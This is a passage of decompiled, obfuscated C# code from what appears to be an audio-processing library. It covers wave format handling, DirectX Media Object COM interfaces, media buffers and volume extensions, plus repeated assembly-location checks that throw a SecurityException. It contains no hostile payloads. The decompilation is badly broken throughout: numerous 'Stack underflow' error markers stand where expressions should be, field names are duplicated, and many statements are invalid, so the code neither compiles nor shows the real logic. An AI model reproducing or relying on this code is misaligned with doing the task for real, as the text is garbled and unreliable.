			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 2
			//IL_002b: Incompatible stack heights: 0 vs 1
			if (((_0004)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
				global::_0013._0005 obj = ((_0004)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_002b: Stack underflow*/(obj);
				this._0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		static _0004()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001B
{
	internal struct _0004
	{
		private Guid m__0001;

		private Guid _0002;

		private bool m__0001;

		private bool _0002;

		private int m__0001;

		private Guid _0003;

		private IntPtr m__0001;

		private int _0002;

		private IntPtr _0002;

		public Guid MajorType => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public string MajorTypeName
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001(((_0004)/*Error near IL_0007: Stack underflow*/).m__0001);
				return (string)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public Guid SubType => ((_0004)/*Error near IL_0007: Stack underflow*/)._0002;

		public string SubTypeName
		{
			get
			{
				//IL_0035: Incompatible stack heights: 0 vs 2
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_003f: Incompatible stack heights: 0 vs 1
				_ = _0094_0002._0004_0006;
				Guid guid = ((_0004)/*Error near IL_000c: Stack underflow*/).m__0001;
				Guid guid2 = global::_0008._0005._0003;
				/*Error near IL_003c: Stack underflow*/(guid, guid2);
				if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
				{
					return global::_0011._0018._0001(((_0004)/*Error near IL_001c: Stack underflow*/)._0002);
				}
				return this._0002.ToString();
			}
		}

		public bool FixedSizeSamples => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public int SampleSize => ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;

		public Guid FormatType => ((_0004)/*Error near IL_0007: Stack underflow*/)._0003;

		public string FormatTypeName
		{
			get
			{
				//IL_0077: Incompatible stack heights: 0 vs 2
				//IL_0081: Incompatible stack heights: 0 vs 1
				//IL_0088: Incompatible stack heights: 0 vs 1
				_ = _0094_0002._0004_0006;
				Guid guid = ((_0004)/*Error near IL_000c: Stack underflow*/)._0003;
				Guid guid2 = global::_0013._0004._0001;
				/*Error near IL_0081: Stack underflow*/(guid, guid2);
				if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
				{
					_0080._0014._0001(107390775);
					return (string)/*Error near IL_001d: Stack underflow*/;
				}
				if (_0094_0002._0004_0006(_0003, Guid.Empty))
				{
					return _0080._0014._0001(107390734);
				}
				if (_0094_0002._0004_0006(_0003, global::_0013._0004._0004))
				{
					return _0080._0014._0001(107390725);
				}
				return FormatType.ToString();
			}
		}

		public global::_0005._0005 _0001()
		{
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			_ = _0094_0002._0004_0006;
			Guid guid = ((_0004)/*Error near IL_000c: Stack underflow*/)._0003;
			Guid guid2 = global::_0013._0004._0004;
			/*Error near IL_003a: Stack underflow*/(guid, guid2);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return global::_0011._0018._0001(((_0004)/*Error near IL_001c: Stack underflow*/)._0002);
			}
			throw new InvalidOperationException(_0080._0014._0001(107390740));
		}

		public unsafe void _0001(global::_0005._0005 _0002)
		{
			//IL_0108: Incompatible stack heights: 0 vs 1
			//IL_010e: Incompatible stack heights: 0 vs 1
			Guid guid = global::_0008._0005._0003;
			((_0004*)(nint)/*Error near IL_000f: Stack underflow*/)->_0001 = guid;
			if (/*Error near IL_0015: Stack underflow*/ is global::_0002._0005 obj)
			{
				this._0002 = obj._0001;
			}
			else
			{
				switch (_0002._0001)
				{
				case WaveFormatEncoding.Pcm:
					this._0002 = global::_0011._0001._0001;
					break;
				case WaveFormatEncoding.IeeeFloat:
					this._0002 = global::_0011._0001._0008;
					break;
				case WaveFormatEncoding.MpegLayer3:
					this._0002 = global::_0011._0001._0012;
					break;
				default:
					throw new ArgumentException(_0008_0002._0007_0005(_0080._0014._0001(107390199), _0002._0001));
				}
			}
			this.m__0001 = _0094_0002._0004_0006(SubType, global::_0011._0001._0001) || _0094_0002._0004_0006(SubType, global::_0011._0001._0008);
			_0003 = global::_0013._0004._0004;
			if (this._0002 < _0098._0089_0004(_0002))
			{
				throw new InvalidOperationException(_0080._0014._0001(107390126));
			}
			_009A._008F_0004(_0002, this._0002, false);
		}
	}
	internal sealed class _0003
	{
		[CompilerGenerated]
		private int m__0001;

		[CompilerGenerated]
		private int _0002;

		[CompilerGenerated]
		private int m__0003;

		public int Size
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/).m__0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int MaxLookahead
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Alignment
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0003;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/).m__0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0003(int _001E_001E, int _0087_008F_0006, int _0019_0083_0006)
		{
			Size = _001E_001E;
			MaxLookahead = _0087_008F_0006;
			Alignment = _0019_0083_0006;
		}

		public override string _0001()
		{
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			_ = _0089_0002._0092_0005;
			_0080._0014._0001(107391068);
			_ = ((_0003)/*Error near IL_0040: Stack underflow*/).Size;
			object obj = (int)/*Error near IL_0015: Stack underflow*/;
			object obj2 = Alignment;
			object obj3 = MaxLookahead;
			return /*Error near IL_0030: Stack underflow*/((string)/*Error near IL_0030: Stack underflow*/, obj, obj2, obj3);
		}
	}
}
namespace _0018
{
	internal struct _0007
	{
		public _0080._0003 _0001;

		public global::_0014._0003 _0001;

		public float _0001;

		public float _0002;

		public float _0003;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string _0002;
	}
}
namespace _0080
{
	internal enum _0003
	{
		_0001,
		_0002,
		_0003,
		_0004,
		_0005
	}
}
namespace _0014
{
	[Flags]
	internal enum _0003
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10
	}
}
namespace _0008
{
	internal static class _0005
	{
		public static readonly Guid _0001;

		public static readonly Guid _0002;

		public static readonly Guid _0003;

		public static readonly Guid _0004;

		public static readonly Guid _0005;

		public static readonly Guid _0006;

		public static readonly Guid _0007;

		public static readonly Guid _0008;

		public static readonly Guid _000E;

		public static readonly Guid _000F;

		public static readonly Guid _0010;

		public static readonly Guid _0011;

		public static readonly Guid[] _0001;

		public static readonly string[] _0001;

		static _0005()
		{
			//IL_02f3: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_02f9: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			global::_0008._0005._0001 = new Guid(_0080._0014._0001(107390979));
			_0002 = new Guid(_0080._0014._0001(107391474));
			_0003 = new Guid(_0080._0014._0001(107391393));
			_0004 = new Guid(_0080._0014._0001(107391376));
			_0005 = new Guid(_0080._0014._0001(107391327));
			_0006 = new Guid(_0080._0014._0001(107391246));
			_0007 = new Guid(_0080._0014._0001(107390717));
			_0008 = new Guid(_0080._0014._0001(107390636));
			_000E = new Guid(_0080._0014._0001(107390619));
			_000F = new Guid(_0080._0014._0001(107390538));
			_0010 = new Guid(_0080._0014._0001(107390521));
			_0011 = new Guid(_0080._0014._0001(107390952));
			global::_0008._0005._0001 = new Guid[12]
			{
				global::_0008._0005._0001,
				_0002,
				_0003,
				_0004,
				_0005,
				_0006,
				_0007,
				_0008,
				_000E,
				_000F,
				_0010,
				_0011
			};
			_0001 = new string[12]
			{
				_0080._0014._0001(107390935),
				_0080._0014._0001(107390886),
				_0080._0014._0001(107390901),
				_0080._0014._0001(107390860),
				_0080._0014._0001(107390871),
				_0080._0014._0001(107390830),
				_0080._0014._0001(107390845),
				_0080._0014._0001(107390836),
				_0080._0014._0001(107390815),
				_0080._0014._0001(107390806),
				_0080._0014._0001(107390765),
				_0080._0014._0001(107390752)
			};
		}
	}
}
namespace _0016
{
	[ComImport]
	[Guid("bbeea841-0a63-4f52-a7ab-a9b3a84ed38a")]
	internal sealed class _0004
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		public extern _0004();
	}
}
namespace _0007
{
	internal sealed class _0005 : IDisposable
	{
		internal global::_001E._0004 _0001;

		private global::_001E._0012 m__0001;

		private global::_0016._0004 m__0001;

		public global::_001E._0004 MediaObject => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0005()
		{
			this.m__0001 = new global::_0016._0004();
			this._0001 = new global::_001E._0004((global::_0013._0005)(object)this.m__0001);
			this.m__0001 = (global::_001E._0012)(object)this.m__0001;
		}

		public void _0001()
		{
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 2
			//IL_0065: Incompatible stack heights: 0 vs 1
			if (((_0005)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				_ = _0098._008A_0004;
				global::_001E._0012 obj = ((_0005)/*Error near IL_0015: Stack underflow*/).m__0001;
				/*Error near IL_0065: Stack underflow*/(obj);
				this.m__0001 = null;
			}
			if (this._0001 != null)
			{
				this._0001._0001();
				this._0001 = null;
			}
			if (this.m__0001 != null)
			{
				_0098._008A_0004(this.m__0001);
				this.m__0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}
	}
}
namespace _000F
{
	[Flags]
	internal enum _0004
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4
	}
}
namespace _0019
{
	[Flags]
	internal enum _0002
	{
		_0001 = 0,
		_0002 = 1
	}
}
namespace _000E
{
	[StructLayout(LayoutKind.Sequential, Pack = 8)]
	internal struct _0003 : IDisposable
	{
		[MarshalAs(UnmanagedType.Interface)]
		private global::_0010._0004 m__0001;

		private global::_0010._0003 m__0001;

		private long m__0001;

		private long _0002;

		public unsafe global::_0010._0004 MediaBuffer
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003*)(nint)/*Error near IL_0009: Stack underflow*/)->_0001 = (global::_0010._0004)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Length => ((global::_0004._0005)((_0003)/*Error near IL_0007: Stack underflow*/).m__0001)._0001;

		public unsafe global::_0010._0003 StatusFlags
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003*)(nint)/*Error near IL_0009: Stack underflow*/)->_0001 = (global::_0010._0003)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public unsafe long Timestamp
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003*)(nint)/*Error near IL_0009: Stack underflow*/)->_0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public unsafe long Duration
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003*)(nint)/*Error near IL_0009: Stack underflow*/)->_0002 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public unsafe bool MoreDataAvailable
		{
			get
			{
				//IL_0009: Unknown result type (might be due to invalid IL or missing references)
				//IL_000f: Invalid comparison between Unknown and I4
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				_ = ((_0003*)/*Error near IL_001a: Stack underflow*/)->StatusFlags;
				return (/*Error near IL_000a: Stack underflow*/ & 0x1000000) == 16777216;
			}
		}

		public _0003(int _0088_008F_0006)
		{
			this.m__0001 = new global::_0004._0005(_0088_008F_0006);
			this.m__0001 = global::_0010._0003._0001;
			this.m__0001 = 0L;
			_0002 = 0L;
		}

		public void _0001()
		{
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			if (((_0003)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				global::_0004._0005 obj = (global::_0004._0005)((_0003)/*Error near IL_0010: Stack underflow*/).m__0001;
				if (0 == 0)
				{
					obj._0001();
				}
				this.m__0001 = null;
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		public void _0001(byte[] _0002, int _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			global::_0004._0005 obj = (global::_0004._0005)((_0003)/*Error near IL_000b: Stack underflow*/).m__0001;
			global::_0011._0018._0001((byte[])/*Error near IL_0015: Stack underflow*/, (int)/*Error near IL_0015: Stack underflow*/, obj);
		}
	}
}
namespace _0010
{
	[Flags]
	internal enum _0003
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4,
		_0005 = 0x1000000
	}
}
namespace _001A
{
	[Flags]
	internal enum _0001
	{
		_0001 = 0,
		_0002 = 1
	}
}
namespace _0017
{
	[Flags]
	internal enum _0005
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2
	}
}
namespace _0018
{
	[Guid("2c3cd98a-2bfa-4a53-9c27-5249ba64ba0f")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0008
	{
		int _0001(int _0002, out Guid _0003, out IntPtr _0004, out int _0005);

		int _0001(int _0002);

		int _0001();

		int _0001(out _0008 _0002);
	}
}
namespace _0013
{
	[ComImport]
	[SuppressUnmanagedCodeSecurity]
	[Guid("d8ad0f58-5494-4102-97c5-ec798e59bcf4")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _0005
	{
		[PreserveSig]
		int _0001(out int _0002, out int _0003);

		[PreserveSig]
		int _0001(int _0002, out _001E._0005 _0003);

		[PreserveSig]
		int _0001(int _0002, out global::_0001._0003 _0003);

		[PreserveSig]
		int _0001(int _0002, int _0003, out _001B._0004 _0004);

		[PreserveSig]
		int _0002(int _0002, int _0003, out _001B._0004 _0004);

		[PreserveSig]
		int _0001(int _0002, [In] ref _001B._0004 _0003, global::_0017._0005 _0004);

		[PreserveSig]
		int _0002(int _0002, [In] ref _001B._0004 _0003, global::_0017._0005 _0004);

		[PreserveSig]
		int _0001(int _0002, out _001B._0004 _0003);

		[PreserveSig]
		int _0002(int _0002, out _001B._0004 _0003);

		[PreserveSig]
		int _0001(int _0002, out int _0003, out int _0004, out int _0005);

		[PreserveSig]
		int _0001(int _0002, out int _0003, out int _0004);

		[PreserveSig]
		int _0001(int _0002, out long _0003);

		[PreserveSig]
		int _0001(int _0002, long _0003);

		[PreserveSig]
		int _0001();

		[PreserveSig]
		int _0001(int _0002);

		[PreserveSig]
		int _0002();

		[PreserveSig]
		int _0003();

		[PreserveSig]
		int _0001(int _0002, out global::_0019._0002 _0003);

		[PreserveSig]
		int _0001(int _0002, [In] global::_0010._0004 _0003, global::_000F._0004 _0004, long _0005, long _0006);

		[PreserveSig]
		int _0001(_001A._0001 _0002, int _0003, [In][Out][MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] global::_000E._0003[] _0004, out int _0005);

		[PreserveSig]
		int _0001(bool _0002);
	}
}
namespace _001E
{
	[Flags]
	internal enum _0005
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4,
		_0005 = 8
	}
}
namespace _0001
{
	[Flags]
	internal enum _0003
	{
		_0001 = 1,
		_0002 = 2,
		_0003 = 4,
		_0004 = 8,
		_0005 = 0x10
	}
}
namespace _007F
{
	[ComImport]
	[Guid("f447b69e-1884-4a7e-8055-346f74d6edb3")]
	internal sealed class _0004
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		public extern _0004();
	}
}
namespace _0019
{
	internal sealed class _0003 : IDisposable
	{
		internal global::_001E._0004 _0001;

		private global::_001E._0012 m__0001;

		private global::_0004._0004 m__0001;

		private global::_007F._0004 m__0001;

		public global::_001E._0004 MediaObject => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0003()
		{
			this.m__0001 = new global::_007F._0004();
			this._0001 = new global::_001E._0004((global::_0013._0005)(object)this.m__0001);
			this.m__0001 = (global::_001E._0012)(object)this.m__0001;
			this.m__0001 = (global::_0004._0004)(object)this.m__0001;
		}

		public void _0001()
		{
			//IL_007b: Incompatible stack heights: 0 vs 1
			//IL_0081: Incompatible stack heights: 0 vs 2
			//IL_008b: Incompatible stack heights: 0 vs 1
			if (((_0003)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				_ = _0098._008A_0004;
				global::_001E._0012 obj = ((_0003)/*Error near IL_0015: Stack underflow*/).m__0001;
				/*Error near IL_008b: Stack underflow*/(obj);
				this.m__0001 = null;
			}
			if (this.m__0001 != null)
			{
				_0098._008A_0004(this.m__0001);
				this.m__0001 = null;
			}
			if (this._0001 != null)
			{
				this._0001._0001();
				this._0001 = null;
			}
			if (this.m__0001 != null)
			{
				_0098._008A_0004(this.m__0001);
				this.m__0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0013
{
	internal static class _0006
	{
		public static global::_0002._0007 _0001(this _001C._0004 _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_001C._0004)/*Error near IL_000d: Stack underflow*/);
			return (global::_0002._0007)/*Error near IL_0005: Stack underflow*/;
		}

		public static void _0001(this global::_0010._0006 _0002, global::_0002._0007 _0003, bool _0004 = false)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			_001C._0004 obj2;
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				new global::_0006._000E((global::_0002._0007)/*Error near IL_0028: Stack underflow*/);
				_001C._0004 obj = (_001C._0004)/*Error near IL_0009: Stack underflow*/;
				obj2 = obj;
			}
			else
			{
				_001C._0004 obj = new global::_0001._0008(_0003);
				obj2 = obj;
			}
			_001C._0004 obj3 = obj2;
			_0002._0001(obj3);
		}

		public static global::_0005._0005 _0001(this global::_0005._0005 _0002)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			global::_0002._0005 obj = /*Error near IL_0003: Stack underflow*/as global::_0002._0005;
			if ((int)/*Error near IL_000d: Stack underflow*/ == 0)
			{
				return _0002;
			}
			return global::_0011._0018._0001(obj);
		}

		public static _001C._0004 _0001(this global::_0002._0007 _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			new global::_0006._000E((global::_0002._0007)/*Error near IL_000d: Stack underflow*/);
			return (_001C._0004)/*Error near IL_0005: Stack underflow*/;
		}

		public static _001C._0004 _0002(this global::_0002._0007 _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			new global::_0001._0008((global::_0002._0007)/*Error near IL_000d: Stack underflow*/);
			return (_001C._0004)/*Error near IL_0005: Stack underflow*/;
		}

		public static global::_0002._0007 _0001(this global::_0002._0007 _0002, global::_0002._0007 _0003)
		{
			//IL_0014: Incompatible stack heights: 0 vs 4
			//IL_0017: Incompatible stack heights: 0 vs 3
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = new global::_0002._0007[2];
			_ = 0;
			((object[])/*Error near IL_000b: Stack underflow*/)[/*Error near IL_000b: Stack underflow*/] = (object)/*Error near IL_000b: Stack underflow*/;
			/*Error near IL_000b: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0010: Stack underflow*/)[/*Error near IL_0010: Stack underflow*/] = (object)/*Error near IL_0010: Stack underflow*/;
			new global::_0002._000E((IEnumerable<global::_0002._0007>)/*Error near IL_001e: Stack underflow*/);
			return (global::_0002._0007)/*Error near IL_0013: Stack underflow*/;
		}

		public static global::_0002._0007 _0001(this global::_0002._0007 _0002, TimeSpan _0003, global::_0002._0007 _0004)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 3
			new global::_0007._0008((global::_0002._0007)/*Error near IL_0007: Stack underflow*/);
			((global::_0007._0008)/*Error near IL_002c: Stack underflow*/).LeadOut = (TimeSpan)/*Error near IL_002c: Stack underflow*/;
			global::_0007._0008 obj = (global::_0007._0008)/*Error near IL_000d: Stack underflow*/;
			return new global::_0002._000E(new global::_0002._0007[2] { obj, _0004 });
		}

		public static global::_0002._0007 _0001(this global::_0002._0007 _0002, TimeSpan _0003)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 3
			new global::_0007._0008((global::_0002._0007)/*Error near IL_0007: Stack underflow*/);
			((global::_0007._0008)/*Error near IL_0018: Stack underflow*/).SkipOver = (TimeSpan)/*Error near IL_0018: Stack underflow*/;
			return (global::_0002._0007)/*Error near IL_000d: Stack underflow*/;
		}

		public static global::_0002._0007 _0002(this global::_0002._0007 _0002, TimeSpan _0003)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 3
			new global::_0007._0008((global::_0002._0007)/*Error near IL_0007: Stack underflow*/);
			((global::_0007._0008)/*Error near IL_0018: Stack underflow*/).Take = (TimeSpan)/*Error near IL_0018: Stack underflow*/;
			return (global::_0002._0007)/*Error near IL_000d: Stack underflow*/;
		}

		public static global::_0002._0007 _0001(this global::_0002._0007 _0002, float _0003 = 0.5f, float _0004 = 0.5f)
		{
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = ((global::_0002._0007)/*Error near IL_002c: Stack underflow*/).WaveFormat;
			if (((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0001 == 1)
			{
				return (global::_0002._0007)/*Error near IL_000f: Stack underflow*/;
			}
			return new global::_0008._0006(_0002)
			{
				LeftVolume = _0003,
				RightVolume = _0004
			};
		}

		public static global::_0002._0007 _0002(this global::_0002._0007 _0002, float _0003 = 1f, float _0004 = 1f)
		{
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			_ = ((global::_0002._0007)/*Error near IL_002c: Stack underflow*/).WaveFormat;
			if (((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0001 == 2)
			{
				return (global::_0002._0007)/*Error near IL_000f: Stack underflow*/;
			}
			return new global::_000F._0007(_0002)
			{
				LeftVolume = _0003,
				RightVolume = _0004
			};
		}
	}
}
namespace _0017
{
	internal sealed class _0006 : IDisposable, global::_0013._0008
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public _0006 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		internal readonly AutoResetEvent _0001;

		internal readonly SynchronizationContext _0001;

		internal IntPtr _0001;

		internal volatile bool _0001;

		internal global::_0011._0005[] _0001;

		[CompilerGenerated]
		internal EventHandler<global::_0001._0006> _0001;

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		[CompilerGenerated]
		private int m__0001;

		[CompilerGenerated]
		private int m__0002;

		[CompilerGenerated]
		private int m__0003;

		[CompilerGenerated]
		private global::_0005._0005 m__0001;

		public static int DeviceCount
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public int BufferMilliseconds
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int NumberOfBuffers
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int DeviceNumber
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0006)/*Error near IL_0009: Stack underflow*/).m__0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
